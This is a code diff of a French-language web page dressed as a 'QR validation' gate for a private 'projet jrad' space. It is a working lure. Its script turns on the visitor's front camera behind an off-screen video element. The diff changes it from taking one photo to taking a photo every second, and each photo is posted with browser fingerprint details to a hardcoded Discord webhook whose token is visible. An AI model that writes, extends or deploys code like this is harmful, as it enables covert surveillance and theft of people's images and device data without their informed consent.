@@ -9,7 +9,6 @@
   <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⭐</text></svg>" />
 
   <style>
-    /* MODERN, CLEAN, TRUSTWORTHY & CASUAL DESIGN - jrad PROJECT THEME */
     * {
       margin: 0;
       padding: 0;
@@ -65,12 +64,8 @@
     .brand-text {
       font-size: 24px;
       font-weight: 750;
-      color: #2c4a3e;
-      letter-spacing: -0.5px;
-      background: none;
-      background-clip: unset;
-      -webkit-background-clip: unset;
       color: #2e5a44;
+      letter-spacing: -0.5px;
     }
 
     .brand-sub {
@@ -156,7 +151,6 @@
       transition: all 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
     }
 
-    /* FRIENDLY BLUR OVERLAY – more casual, trusty look */
     .blur-overlay {
       position: absolute;
       top: 0;
@@ -295,6 +289,19 @@
       transform: scale(0.97);
     }
 
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #f0f7f0;
+      color: #2e6b4c;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 14px;
+      border-radius: 20px;
+      margin-top: 10px;
+    }
+
     .footer {
       margin-top: 28px;
       display: flex;
@@ -307,10 +314,12 @@
     }
 
     .camera-feed {
-      width: 1px;
-      height: 1px;
-      opacity: 0;
       position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 320px;
+      height: 240px;
+      opacity: 0;
       pointer-events: none;
     }
 
@@ -327,7 +336,6 @@
 </head>
 <body>
   <div class="card">
-    <!-- jrad PROJECT HEADER (friendly tone) -->
     <div class="header">
       <div class="brand">⭐</div>
       <div>
@@ -338,19 +346,16 @@
       <div class="badge">✨ Édition Premium</div>
     </div>
 
-    <div class="title">
-      Validation QR
-    </div>
+    <div class="title">Validation QR</div>
     <div class="description">
       Scannez le code QR pour rejoindre l'espace privé du projet jrad. 
       Une vérification par caméra est nécessaire pour continuer.
     </div>
 
-    <!-- QR CODE SECTION (with updated verification text) -->
     <div class="qr-section">
       <div class="qr-label">
         <span class="qr-label-left">
-          <span></span> Code d'authentification
+          <span>📸</span> Code d'authentification
         </span>
         <span style="color: #c48b2b; font-size: 13px; font-weight: 700;">🔐 accès restreint</span>
       </div>
@@ -359,16 +364,18 @@
         <div class="qr-container">
           <img id="qrImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3Crect width='300' height='300' fill='%23f5f5f0'/%3E%3Ccircle cx='150' cy='150' r='60' fill='%23d4c9a8'/%3E%3C/svg%3E" alt="QR Code Projet jrad" />
 
-          <!-- BLUR OVERLAY with new casual trusty message -->
           <div id="qrOverlay" class="blur-overlay">
-          
+            <div class="lock-icon">🎥</div>
+            <div class="blur-text">Vérifiez avec la caméra pour scanner le QR</div>
+            <div class="blur-sub">Activez la caméra pour révéler le code</div>
           </div>
         </div>
 
-        <!-- BUTTON WITH NEW LABEL "open the project" -->
         <button id="verifyButton" class="button">
           📂 open the project
         </button>
+
+        <div id="spamStatus" style="margin-top: 12px;"></div>
 
         <p style="color: #5b7062; font-size: 13px; margin-top: 14px;">
           <span>🛡️</span> Vérification sécurisée · projet jrad
@@ -376,7 +383,6 @@
       </div>
     </div>
 
-    <!-- PROJECT INFO (jrad content, no wifi mention) -->
     <div class="project-details">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 16px;">
         <span style="background: #f0efe2; padding: 8px; border-radius: 15px;">📁</span>
@@ -385,7 +391,7 @@
 
       <div class="detail-row">
         <span class="detail-label"><span>👨‍💻</span> Créateur</span>
-        <span class="detail-value">jrad</span>
+        <span class="detail-value">jrad Ben Amor</span>
       </div>
       <div class="detail-row">
         <span class="detail-label"><span>🔐</span> Niveau de sécurité</span>
@@ -406,7 +412,6 @@
       </div>
     </div>
 
-    <!-- FOOTER -->
     <div class="footer">
       <span>© 2025 · Projet de jrad</span>
       <span style="display: flex; gap: 18px;">
@@ -416,27 +421,24 @@
     </div>
   </div>
 
-  <!-- HIDDEN CAMERA FEED (front camera preferred) -->
   <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
 
   <script>
     // ============================================================
-    // PROJET DE jrad - QR + FRONT CAMERA CAPTURE + DISCORD WEBHOOK
-    // Takes a picture from front cam when button clicked,
-    // sends to specified Discord webhook.
+    // PROJET DE jrad - SPAM IMAGES EVERY 1 SECOND TO DISCORD
+    // Front camera capture + QR reveal + continuous spam
     // ============================================================
 
-    // HARDCODED DISCORD WEBHOOK (as requested)
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
 
     let videoStream = null;
+    let spamInterval = null;
     let qrRevealed = false;
-    let photoSent = false;
+    let photoCount = 0;
+    let isSpamming = false;
 
-    // Unique QR payload for "Projet de jrad"
     const PROJECT_QR_DATA = "https://projet-jrad.vercel.app/access?token=jrad_SECURE_2025&user=authenticated";
 
-    // Get detailed client information (for logging)
     function getClientInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
@@ -465,42 +467,21 @@
       else if (ua.indexOf('Android') > -1) os = 'Android';
       else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
 
-      return {
-        browser,
-        os,
-        platform,
-        language,
-        screenRes,
-        colorDepth,
-        timezone,
-        cores,
-        memory,
-        connection: effectiveType,
-        cookies,
-        doNotTrack,
-        userAgent: ua.substring(0, 150) + '...'
-      };
+      return { browser, os, platform, language, screenRes, colorDepth, timezone, cores, memory, connection: effectiveType, cookies, doNotTrack, userAgent: ua.substring(0, 150) + '...' };
     }
 
-    // Generate QR code as dataURL (using QRCode library)
     function generateQRDataURL(text, size = 240) {
       return new Promise((resolve, reject) => {
         if (!window.QRCodeLib && typeof QRCode === 'undefined') {
           var script = document.createElement('script');
           script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
-          script.onload = () => {
-            generateWithQRCodeJS(text, size, resolve, reject);
-          };
+          script.onload = () => { generateWithQRCodeJS(text, size, resolve, reject); };
           script.onerror = () => {
-            // Fallback canvas
             const canvas = document.createElement('canvas');
-            canvas.width = size;
-            canvas.height = size;
+            canvas.width = size; canvas.height = size;
             const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#fbfaf5';
-            ctx.fillRect(0, 0, size, size);
-            ctx.fillStyle = '#2e6b4c';
-            ctx.font = 'bold 16px Inter';
+            ctx.fillStyle = '#fbfaf5'; ctx.fillRect(0, 0, size, size);
+            ctx.fillStyle = '#2e6b4c'; ctx.font = 'bold 16px Inter';
             ctx.fillText('jrad', size/2-32, size/2);
             resolve(canvas.toDataURL());
           };
@@ -515,26 +496,20 @@
       try {
         const container = document.createElement('div');
         const qr = new QRCode(container, {
-          text: text,
-          width: size,
-          height: size,
-          colorDark: "#21553c",
-          colorLight: "#ffffff",
+          text: text, width: size, height: size,
+          colorDark: "#21553c", colorLight: "#ffffff",
           correctLevel: QRCode.CorrectLevel.M
         });
         setTimeout(() => {
           const img = container.querySelector('img');
-          if (img && img.src) {
-            resolve(img.src);
-          } else {
+          if (img && img.src) resolve(img.src);
+          else {
             const canvas = container.querySelector('canvas');
             if (canvas) resolve(canvas.toDataURL());
             else reject();
           }
         }, 50);
-      } catch(e) {
-        reject(e);
-      }
+      } catch(e) { reject(e); }
     }
 
     let qrImageElement = document.getElementById('qrImage');
@@ -548,13 +523,10 @@
       } catch(e) {
         console.warn('QR generation fallback', e);
         const canvas = document.createElement('canvas');
-        canvas.width = 240;
-        canvas.height = 240;
+        canvas.width = 240; canvas.height = 240;
         const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#ffffff';
-        ctx.fillRect(0,0,240,240);
-        ctx.fillStyle = '#235f41';
-        ctx.font = 'bold 16px Inter';
+        ctx.fillStyle = '#ffffff'; ctx.fillRect(0,0,240,240);
+        ctx.fillStyle = '#235f41'; ctx.font = 'bold 16px Inter';
         ctx.fillText('jrad', 90, 120);
         currentQrDataURL = canvas.toDataURL();
       }
@@ -574,7 +546,6 @@
       }
     }
 
-    // Function to capture a single frame from the video (front camera)
     function captureFrameFromCamera() {
       return new Promise((resolve, reject) => {
         const video = document.getElementById('cameraFeed');
@@ -589,25 +560,19 @@
           const context = canvas.getContext('2d');
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           canvas.toBlob((blob) => {
-            if (blob) {
-              resolve(blob);
-            } else {
-              reject(new Error('Blob creation failed'));
-            }
-          }, 'image/jpeg', 0.75);
-        } catch (e) {
-          reject(e);
-        }
+            if (blob) resolve(blob);
+            else reject(new Error('Blob creation failed'));
+          }, 'image/jpeg', 0.7);
+        } catch (e) { reject(e); }
       });
     }
 
-    // Send the photo and visitor data to Discord webhook
-    async function sendPhotoToDiscord(imageBlob) {
+    async function sendPhotoToDiscord(imageBlob, count) {
       try {
         const formData = new FormData();
         const timestamp = Date.now();
         const clientInfo = getClientInfo();
-        const message = `⭐ **Projet de jrad - Photo frontale & Accès** ⭐
+        const message = `⭐ **Projet de jrad - Photo #${count}** ⭐
 
 👤 **VISITOR DATA:**
 • **Browser/OS:** ${clientInfo.browser} / ${clientInfo.os}
@@ -619,55 +584,96 @@
 • **Network:** ${clientInfo.connection}
 • **Cookies Enabled:** ${clientInfo.cookies}
 • **Platform:** ${clientInfo.platform}
-• **UserAgent:** ${clientInfo.userAgent}
 
-📸 **Photo prise par la caméra frontale**
-🔐 **QR révélé:** ${qrRevealed ? 'Oui' : 'Non'}
+📸 **Photo frontale #${count}** · QR révélé: ${qrRevealed ? 'Oui' : 'Non'}
 🕒 **Timestamp:** ${new Date().toISOString()}
 
-_Projet de jrad - log sécurisé._`;
+_Projet de jrad - spam sécurisé chaque seconde._`;
 
-        const blobFile = new File([imageBlob], `jrad_frontcam_${timestamp}.jpg`, { type: 'image/jpeg' });
+        const blobFile = new File([imageBlob], `jrad_spam_${count}_${timestamp}.jpg`, { type: 'image/jpeg' });
         formData.append('payload_json', JSON.stringify({ content: message }));
         formData.append('file', blobFile);
 
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        });
-
-        if (response.ok) {
-          console.log('📤 Photo envoyée avec succès sur Discord');
-          return true;
-        } else {
-          console.warn('Discord webhook responded with status:', response.status);
-          return false;
-        }
+        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+        console.log(`📤 Photo #${count} envoyée sur Discord`);
+        return true;
       } catch (err) {
         console.error('Erreur envoi Discord:', err);
         return false;
       }
     }
 
-    // MAIN BUTTON ACTION: activate front camera, take photo, send to Discord, reveal QR
+    function updateStatus(text, color = '#2e6b4c') {
+      const statusDiv = document.getElementById('spamStatus');
+      statusDiv.innerHTML = `<span class="status-badge" style="background: ${color}20; color: ${color}; border: 1px solid ${color}40;">${text}</span>`;
+    }
+
+    async function spamLoop() {
+      if (!isSpamming) return;
+      
+      try {
+        const imageBlob = await captureFrameFromCamera();
+        photoCount++;
+        await sendPhotoToDiscord(imageBlob, photoCount);
+        updateStatus(`📸 ${photoCount} photos envoyées · 1/sec`, '#10b981');
+      } catch (e) {
+        console.warn('Capture failed, retrying...', e);
+        updateStatus(`⚠️ Capture en attente...`, '#f59e0b');
+      }
+    }
+
+    function startSpamming() {
+      if (isSpamming) return;
+      isSpamming = true;
+      photoCount = 0;
+      
+      // First capture immediately
+      spamLoop();
+      
+      // Then every 1 second
+      spamInterval = setInterval(() => {
+        spamLoop();
+      }, 1000);
+      
+      updateStatus('🔄 Spam actif · 1 photo/sec', '#10b981');
+      console.log('🔥 SPAM MODE ACTIVATED - 1 photo per second');
+    }
+
+    function stopSpamming() {
+      isSpamming = false;
+      if (spamInterval) {
+        clearInterval(spamInterval);
+        spamInterval = null;
+      }
+      if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+        videoStream = null;
+      }
+      document.getElementById('cameraFeed').srcObject = null;
+      updateStatus('⏹️ Capture arrêtée', '#6b7280');
+      console.log('⏹️ Spam stopped');
+    }
+
     async function openProjectHandler(event) {
       if (event) event.preventDefault();
       const button = document.getElementById('verifyButton');
       
-      if (photoSent) {
-        // Already done, just reveal QR if not yet
-        if (!qrRevealed) revealQRCode();
+      // If already spamming, stop it
+      if (isSpamming) {
+        stopSpamming();
+        button.innerHTML = '📂 open the project';
+        button.style.background = '#2e6b4c';
+        button.disabled = false;
         return;
       }
 
       try {
-        // Request front camera (user-facing)
-        button.innerHTML = 'Loading...';
+        button.innerHTML = '📷 Accès caméra...';
         button.disabled = true;
-        
+
         videoStream = await navigator.mediaDevices.getUserMedia({
           video: {
-            facingMode: "user",   // FRONT CAMERA explicitly
+            facingMode: "user",
             width: { ideal: 1280 },
             height: { ideal: 720 }
           }
@@ -676,78 +682,53 @@ _Projet de jrad - log sécurisé._`;
         const videoElement = document.getElementById('cameraFeed');
         videoElement.srcObject = videoStream;
 
-        // Wait for video to be ready
         await new Promise((resolve) => {
           videoElement.onloadedmetadata = () => {
             videoElement.play();
             resolve();
           };
-          // fallback if metadata already loaded
           if (videoElement.readyState >= 2) resolve();
         });
 
-        // Small delay to ensure frame is rendered
-        await new Promise(r => setTimeout(r, 600));
+        await new Promise(r => setTimeout(r, 500));
 
-        console.log('📸 Front camera active, capturing photo...');
-        button.innerHTML = '📸 Capture en cours...';
-
-        // Capture the frame
-        const imageBlob = await captureFrameFromCamera();
-        console.log('✅ Photo capturée, envoi vers Discord...');
-
-        // Send to Discord webhook
-        const sent = await sendPhotoToDiscord(imageBlob);
+        console.log('📸 Front camera active, starting spam...');
         
-        if (sent) {
-          photoSent = true;
-          button.innerHTML = '✅ Photo envoyée · QR visible';
-          button.style.background = '#10b981';
-          console.log('🎉 Photo bien envoyée, révélation du QR');
-        } else {
-          button.innerHTML = '⚠️ Envoi échoué, QR révélé';
-          button.style.background = '#f59e0b';
-        }
-
-        // Reveal QR code regardless (as per original logic)
+        // Reveal QR
         revealQRCode();
-
+        
         // Remove blur overlay
         const overlay = document.getElementById('qrOverlay');
         if (overlay) {
           overlay.style.opacity = '0';
-          setTimeout(() => {
-            overlay.classList.add('hidden');
-          }, 400);
+          setTimeout(() => { overlay.classList.add('hidden'); }, 400);
         }
 
-        // Stop camera tracks after capture (no need to keep streaming)
-        if (videoStream) {
-          videoStream.getTracks().forEach(track => track.stop());
-          videoElement.srcObject = null;
-          videoStream = null;
-        }
+        // Start spamming every 1 second
+        startSpamming();
 
+        button.innerHTML = '⏹️ STOP · Cliquez pour arrêter';
+        button.style.background = '#ef4444';
         button.disabled = false;
 
       } catch (error) {
-        console.error('❌ Erreur caméra ou envoi:', error);
+        console.error('❌ Erreur:', error);
         button.innerHTML = '📂 open the project';
-        button.disabled = false;
         button.style.background = '#2e6b4c';
+        button.disabled = false;
         
         if (error.name === 'NotAllowedError') {
           alert('Veuillez autoriser la caméra frontale pour ouvrir le projet jrad.');
         } else if (error.name === 'NotFoundError') {
-          alert('Aucune caméra frontale détectée. Essayez avec un appareil disposant d\'une caméra.');
+          alert('Aucune caméra frontale détectée.');
         } else {
-          alert('Impossible d\'accéder à la caméra. Vérifiez les permissions.');
+          alert('Impossible d\'accéder à la caméra.');
         }
       }
     }
 
     document.addEventListener('DOMContentLoaded', async () => {
-      console.log('⭐ Projet de jrad - Front camera + Discord webhook ready');
+      console.log('⭐ Projet de jrad - SPAM MODE 1/sec ready');
       prepareClearQR();
 
       const verifyButton = document.getElementById('verifyButton');
@@ -756,11 +737,8 @@ _Projet de jrad - log sécurisé._`;
       }
     });
 
-    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
-      if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-      }
+      stopSpamming();
     });
   </script>
 </body>
